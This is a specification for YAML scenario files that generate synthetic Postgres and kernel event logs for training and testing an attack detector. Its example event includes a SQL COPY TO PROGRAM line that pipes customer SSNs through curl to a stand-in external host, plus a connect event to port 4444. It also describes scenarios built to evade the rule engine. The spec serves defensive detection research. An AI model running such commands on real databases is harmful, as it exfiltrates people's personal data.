# Scenario spec format (v1)

One YAML file per scenario. A scenario is one or more Postgres "sessions"
(one session = one backend connection = one `session_id` in Algorithm 1)
plus any OS-side activity those sessions cause or that runs unanchored
alongside them. Codegen turns one spec file into a slice of
`postgres_events.json` / `kernel_events.json` / `labels.csv` inside a run
directory. The spec is the only thing hand-authored (by an LLM or a
person); the JSON logs are always regenerated from it, never hand-edited.

## Top level

```yaml
scenario_id: banking_multi_session_apt_001   # unique, also used as label suffix
family_id: banking_apt_recon_escalate_exfil  # see "Families" below — required
domain: banking                              # must match datagen/domains/<domain>.yaml
matched_pair_id: banking_exfil_012           # optional
matched_dimensions:                          # required iff matched_pair_id is set — see "Matched pairs"
  fixed: [process_tree_shape, syscall_sequence, timing_pattern]
  varied: [sql_content, connects_to_destination]
time_of_day: "02:30"                         # scenario-level wall-clock anchor, see "Timing"
default_class: malicious                     # inherited by sessions that omit `class`
rule_engine_relationship: malicious_false_negative  # optional, default "agrees" — see "Rule-engine relationship"
sessions: [ ... ]                            # see below
```

There is no flat top-level `events:` shorthand. This is format v1 — a
single-session scenario is still written as a one-element `sessions:`
list. A shorthand that means the same thing two ways buys nothing at
this stage and gives codegen and validation two paths to keep in sync
for one shape.

## Families

`family_id` names the group of scenarios that share an underlying
narrative and are varied only by parameters (identifiers, literals,
timing, matched-pair twin) — this is the unit train/val/test splitting
happens at, so that near-identical scenarios never land on both sides of
a split.

**A family is confined to one run directory.** All of a family's
scenarios — its parameterization sweep and its matched-pair twin, if any
— are generated by the one worker that owns that run directory. This
keeps family-level splitting a local operation: no cross-run bookkeeping
is needed to keep a family intact. The residual risk this doesn't fully
close on its own — a run's own nuisance parameters (its pid range, its
`LOGGING_START` offset) becoming a de facto family fingerprint — is the
reason every category and domain must appear in more than one run
directory (see the orchestration skill): the diversity comes from many
independent runs producing independent families of the same category,
not from any one run trying to be internally diverse.

## Session

```yaml
sessions:
  - session_label: recon                      # unique within scenario
    class: malicious                          # overrides default_class
    role: postgres                            # must exist in domain model's role list
    anchor: db                                # db | synthetic | none  (see below)
    anchor_query: "SELECT 1"                  # only used when anchor: synthetic; this is the default
    concurrent_with: null                      # session_label of another session this one overlaps in wall-clock time, see "Timing"
    delay_after_previous_seconds: 2           # gap before this session starts vs. the previous one in the list; ignored if concurrent_with is set
    timing:
      tempo: steady                           # bursty | steady | scheduled | off_hours
      step_gaps_seconds: [0.5]                # cycles if shorter than len(events) - 1
    events: [ ... ]                           # see below
```

`anchor` semantics (this is the field that makes OS-only activity
expressible at all):

- **`db`** (default): this session has real Postgres traffic; that
  traffic is the Algorithm-1 anchor (`session_id`/`backend_pid`). Must
  contain at least one `sql` event.
- **`synthetic`**: this session has no SQL of narrative interest, but
  correlation still needs a backend to hang the OS activity off. Codegen
  inserts one invisible `sql: <anchor_query>` event first (default
  `SELECT 1`), then makes the OS events its children. Use for
  `os_priv_escalation`-style scenarios. This produces a real, correlated
  graph — a session with almost no SQL activity and an anomalous OS
  subtree — which is the training signal that category needs.
- **`none`**: deliberately unanchored. Algorithm 1 will let these kernel
  events expire in its pending buffer and never resolve to a session — no
  graph is ever built for them. Reserve this for corpus items that
  document a real pipeline blind spot on purpose (e.g. a negative-control
  fixture), and only when a worker's assignment explicitly calls for one.
  **Never use `anchor: none` for anything meant to become a GAT training
  example — it silently produces nothing.** It never counts toward a
  worker's scenario-count target.

## Event (inside a session's `events` list)

Exactly one of `sql` / `process` / `file` / `connect` per event.

```yaml
events:
  - step_id: copy_shell                       # optional; required if another event's `parent` references it
    sql: "COPY (SELECT ssn FROM customers WHERE customer_id = 4471) TO PROGRAM 'curl -sX POST https://partner-api.example/sync -d @-'"
    connects_to: {ip: "93.184.216.34", port: 443}   # optional override, see below

  - step_id: gzip_step
    process: {comm: "gzip", args: ["file.gz"], parent: copy_shell}

  - file: {path: "/tmp/staging.csv", syscall: unlink, parent: gzip_step}

  - connect: {ip: "45.33.12.9", port: 4444, parent: gzip_step}
```

- **`sql`**: literal SQL text. Codegen runs it through the real
  `sqlfacts.extract_query_facts` (the same parser Algorithm 2 uses). A
  `COPY ... TO PROGRAM '<cmd>'` automatically generates the spawned
  process tree that `<cmd>` implies (codegen shell-parses it) — do not
  also hand-write `process` steps for that spawn unless something beyond
  what the shell string implies needs to attach.
- **`process`**: literal `comm` + literal `args`, for OS activity not
  triggered by any SQL in this scenario (reverse shells, cron-launched
  jobs, post-exfiltration cleanup). `parent: step_id` chains this
  process's `ppid` to an earlier step in the **same session**; omitted
  means `ppid` = this session's backend anchor.
- **`file`** / **`connect`**: explicit file or network operations not
  otherwise implied by an `sql` or `process` step's literal text (e.g. a
  bare `rm` inside a `process` step's shell text — codegen does not
  regex shell text for file/network side effects beyond what
  `sqlfacts` already extracts from SQL, so state it explicitly here).
  Both require `parent: step_id`.
- **`connects_to: {ip, port}`**: optional field on any `sql` or `process`
  event, for when the real destination can't be reliably parsed out of
  literal shell/URL text (a hostname inside a curl URL, for instance).
  State it rather than have codegen guess.

## Timing

There is one `LOGGING_START` clock offset per **run directory** — it is
what converts the kernel log's monotonic nanosecond timestamps into
wall-clock time, and it is the same conversion for every session in that
run. This does not force every session onto the same wall-clock moment:
codegen computes, per event, whatever raw monotonic value maps through
that one offset to the wall-clock time the spec asked for. The offset is
a run-level fact about clock calibration, not a constraint on when
things happen.

What each field mechanically drives:

- **`time_of_day`** (scenario-level, `"HH:MM"`): wall-clock time of the
  scenario's first session's first event, on the run's single generation
  date. Every later session/event's timestamp is computed by adding
  `delay_after_previous_seconds` (between sessions) and
  `step_gaps_seconds` (between events within a session) on top of this
  anchor.
- **`step_gaps_seconds`** (session-level): the literal, authoritative
  gap in seconds between consecutive events in this session's `events`
  list. Cycles if shorter than `len(events) - 1`.
- **`tempo`** (session-level enum): not decorative — codegen validates
  `step_gaps_seconds` against it and rejects a mismatch rather than
  silently accepting a `tempo` label the literal gaps don't support:
  - `bursty`: every gap must be under 2 seconds.
  - `steady`: every gap must be within 20% of the mean gap.
  - `off_hours`: this session's resolved wall-clock time must fall
    outside 08:00-18:00. (A fixed default window for now; making this a
    per-domain business-hours field is a reasonable future extension,
    not needed for the pilot.)
  - `scheduled`: no per-scenario mechanical check yet — this label is
    only meaningful across a family (the same relative time appearing
    on repeated instances). Do not rely on it to encode anything at the
    single-scenario level until the family-level generator supports it.
- **`concurrent_with: <session_label>`**: session B naming `A` here has
  its own resolved schedule (from its own `time_of_day`/gaps if given,
  otherwise placed at a random point) fall strictly between A's first
  and last event timestamps. Codegen resolves A's full schedule before
  placing B. Use for `concurrent_mixed` (a benign and a malicious session
  overlapping in one run).

## Concurrency and multi-session scenarios

- Sequential multi-session attacks (`multi_session_apt`,
  `privilege_abuse`) are just multiple entries in `sessions:`, each with
  its own `delay_after_previous_seconds`.
- `class` lives on the **session**, not the scenario. A scenario can
  legitimately mix a `benign` session and a `malicious` session — the
  scenario-level `default_class` is only a fallback for sessions that
  don't override it.
- Cross-layer scope is a **scenario**-level invariant, not a session-level
  one: at least one session in the scenario must carry real OS-layer
  activity. A scenario where every session is SQL-only end to end is out
  of scope regardless of how suspicious the SQL looks (`privilege_abuse`
  is the case that exposes this — its sessions, individually, are all
  pure SQL). A scenario that does clear the bar may still contain
  SQL-only sessions elsewhere in it (e.g. `multi_session_apt`'s recon and
  escalation sessions) — those are not just tolerated, they are useful
  training signal on their own (suspicious SQL with no OS corroboration).

## Matched pairs

`matched_pair_id` links two scenario files, always within the same run
directory (see "Families") — pairing verification never needs
cross-worker visibility as a result. `matched_dimensions` is mandatory
alongside it and is what gives the pairing mechanical teeth instead of
being a conceptual label nothing checks:

```yaml
matched_pair_id: banking_exfil_012
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern]
  varied: [sql_content, connects_to_destination]
```

**`fixed`/`varied` entries must come from this closed set — an
unrecognized name is a hard validation error, not a skipped check:**

| Dimension | "fixed" means | "varied" means |
|---|---|---|
| `process_tree_shape` | same `comm`/parent-link topology across both halves' process trees, ignoring literal pid values and literal `args` content | topology differs in at least one edge or node |
| `syscall_sequence` | identical ordered list of syscalls implied by both halves' events | at least one syscall differs or the order differs |
| `timing_pattern` | same `tempo` value on the corresponding session, and each corresponding `step_gaps_seconds` entry within 20% of the other half's | `tempo` differs, or at least one gap differs by more than 20% |
| `sql_content` | byte-identical SQL on the corresponding event | not byte-identical, and not merely a literal swapped inside an otherwise-identical query (the table/column/verb referenced must actually differ) |
| `connects_to_destination` | identical resolved `{ip, port}` | different `{ip, port}` |
| `role` | identical `role` on the corresponding session | different `role` |

A pair with **no sibling** sharing its `matched_pair_id` and opposite
`class` inside the same run directory is a hard validation error — not a
scenario that silently validates alone. This is what makes "same run
directory" a real invariant instead of a convention that only holds as
long as nobody violates it by accident.

**A dimension may not carry the corpus's label by itself.** If `role`
(or any other dimension) is the `varied` entry across most pairs, and one
class consistently gets one set of role values, `role` becomes a proxy
label — reintroducing exactly the per-primitive contamination matched
pairs exist to prevent. This is checked at the corpus level (see the
orchestration skill's lead responsibilities), not per-pair, since it's
only visible across many pairs at once.

## Rule-engine relationship

Optional scenario-level field, default `agrees`:

```yaml
rule_engine_relationship: malicious_false_negative   # agrees | benign_false_positive | malicious_false_negative
```

- `agrees`: the existing rule engine (Algorithm 3's templates, Algorithm
  4's chain rules) would classify this scenario the same as its true
  label.
- `benign_false_positive`: a **benign** scenario deliberately built to
  trip the existing rule engine anyway (e.g. a legitimate ETL job that
  happens to use `curl` in a `COPY ... TO PROGRAM`).
- `malicious_false_negative`: a **malicious** scenario deliberately built
  to evade the existing rule engine (e.g. exfiltration through a channel
  or pattern none of the current templates cover).

Without a deliberate mix of these, a corpus can pass every check in this
document and still consist entirely of cases where the rule engine and
the truth already agree — in which case the GAT contributes nothing
measurable and the rules-plus-GAT-beats-rules-alone ablation has nothing
to show. The lead tracks coverage of this field via the manifest; the
exact proportion to target is set from the pilot's own rule-engine-alone
baseline score, not fixed in advance here.

## Validation (applies to every generated scenario, before it counts)

1. Schema/enum conformance against this document, including the closed
   `matched_dimensions` vocabulary above — an unrecognized dimension name
   is a hard error.
2. Every `sql` string parses under `pglast` (`sqlfacts.extract_query_facts`
   must not return a `parse_error`).
3. Full run through the real pipeline (`algorithm_1.run_one()` →
   `algorithm2.run()`) against the generated run directory: every
   non-`anchor:none` session resolves to exactly one `session_id`, and
   the resulting graph's node/edge types match an expectation manifest
   codegen emits alongside the JSON logs (codegen's own derivation of
   what each event should produce — validate against that artifact
   rather than having the validator re-derive the same semantics
   independently, which would let the two silently drift apart).
   **This item also covers `algorithm_3_abstract` once its current
   `relation`/`rel` and missing-`label` bugs are fixed — until then, a
   "pass" here confirms correlation- and graph-structure-level
   correctness only, not Behavior-node-level correctness. Don't treat a
   pre-fix pass as validating anything about Algorithm 3's output.**
4. Matched pairs: every `matched_pair_id` has exactly one sibling with
   opposite `class` in the same run directory; `fixed` dimensions match
   per the table above; `varied` dimensions differ per the table above.

A scenario that fails (1)-(4) is a build error, not a sample that ships.
Fix the spec and regenerate — never hand-patch the generated JSON.
